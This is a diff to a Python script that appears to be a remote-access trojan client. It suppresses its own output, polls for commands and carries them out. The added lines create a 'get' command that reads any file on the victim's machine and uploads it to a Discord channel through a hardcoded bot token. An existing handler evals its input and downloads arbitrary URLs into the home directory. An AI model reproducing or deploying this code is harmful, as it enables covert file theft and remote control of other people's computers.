@@ -4,12 +4,13 @@ try:
     from time import sleep
     from subprocess import Popen as system
     from subprocess import PIPE
-    from os import chdir, uname, devnull
+    from os import chdir, uname, devnull, getcwd
     from sys import platform, stdout, stderr
 
     old_command = ""
     command = ""
     loop = 0
+    
 
     stdout = open(devnull, 'w')
     stderr = open(devnull, 'w')
@@ -68,17 +69,38 @@ while True:
                 if command == "None":
                     old_command = ""
                     continue
+                if command.startswith("get "):
+                    token = 'MTE0MTM0MDA2Mzk2ODU0MjczMA.G7bTuQ.kXvBg1R2N-3Z2cYUXDmEVcBIzc7Z_MWvP2Wjtg'
+                    channel_id = '1140989222556274721'
+                    url = f'https://discord.com/api/v9/channels/{channel_id}/messages'
+                    localcmd = command.split()
+                    path = "../" + localcmd[1]
+                    file = open(path, "rb").read()
+                    fileJson = {
+                        "file" : (str(path), open(str(path), 'rb'))
+                    }
+                    payload = {
+                        "content":"message"
+                    }
+                    header = {'Authorization': f'Bot {token}'}
+
+                    try:
+                        post(url, data = payload, headers=header, files=fileJson)
+                    except:
+                        pass
+                    old_command = commandId
                 if command.startswith("webfile "):
                     localcmd = command.split(maxsplit=1)
                     files = eval(localcmd[1])
                     for fileUrl in files:
                         fileData = get(fileUrl).content
-                        fileName = os.path.basename(fileUrl)
+                        fileName = path.basename(fileUrl)
                         filePath = os.path.expanduser("~")
                         with open(f"{filePath}/{fileName}", 'wb') as f:
                             f.write(fileData)
                             f.close()
                     old_command = commandId
+                    continue
                     #filename = os.path.basename(localcmd[1])
                     #print(filename)
                     #ossystem("touch " + filename[0] + filename[1])
